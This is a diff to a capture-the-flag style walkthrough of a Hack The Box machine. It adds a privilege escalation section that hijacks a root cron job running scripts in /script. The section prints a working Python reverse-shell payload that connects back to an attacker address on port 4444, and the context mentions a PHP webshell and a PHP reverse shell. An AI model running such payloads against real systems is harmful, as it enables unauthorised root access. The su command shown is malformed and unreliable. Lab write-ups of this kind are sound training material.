@@ -47,7 +47,7 @@ Access to `http://10.10.10.68`, and it seems to be a simple blog which talks abo
 
 ![AgfJCd.png](https://s2.ax1x.com/2019/04/04/AgfJCd.png)
 
-`phpbash` seems to be a webshell tool. And there is a github repository [phpbash](https://github.com/Arrexel/phpbash) introduce the tool. The introduction of the repo is to drop the file to target and access it by `http://ip/uploads/phpbash.php`. We try to access `http://10.10.10.68/uploads/phpbash.php`. But the file sems not to be here.
+`phpbash` seems to be a webshell tool. And there is a github repository [phpbash](https://github.com/Arrexel/phpbash) introduces the tool. The introduction of the repo is to drop the file to target and access it by `http://ip/uploads/phpbash.php`. Try to access `http://10.10.10.68/uploads/phpbash.php`. But the file seems not to be here.
 
 Utilize the dirbuster to enumerate the directories.
 
@@ -71,6 +71,37 @@ Execute the php script in the target machine `php php-reverse-shell.php`. OK. We
 
 [![AghhQI.png](https://s2.ax1x.com/2019/04/04/AghhQI.png)](https://imgchr.com/i/AghhQI)
 
+## Privilege escalation
+
+Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize `sudo -l` to see the permissions of the user. Something interesting found. We can switch to `scriptmanager` user without password.
+
+![Ag4cn0.png](https://s2.ax1x.com/2019/04/04/Ag4cn0.png)
+
+```
+su -u scrriptmanager bash -i
+```
+
+Try to enumerate the files. And I find an interesting folder inside `/script`. There are two files test.py and test.txt. Try to display the content of `test.py`.
+
+[![AghxO0.png](https://s2.ax1x.com/2019/04/04/AghxO0.png)](https://imgchr.com/i/AghxO0)
+
+The python script is quite straightforwared. It just write `testing 123!` to the file `test.txt`. And if we see the attributes of `test.txt`, the modified time of the file changes each minute. And the file is owned by root. It seems that `root` will execute the python scripts in `/script` folder each minute. So utilize a python script to reverse the root shell(accordint to the information above, the python version of the target machine is 2.7):
+
+```python 
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.16.44",4444));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+```
+
+Set the kali to listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.
+
+![AgICRJ.png](https://s2.ax1x.com/2019/04/04/AgICRJ.png)
+
+[![AgIks1.png](https://s2.ax1x.com/2019/04/04/AgIks1.png)](https://imgchr.com/i/AgIks1)
 
 
 
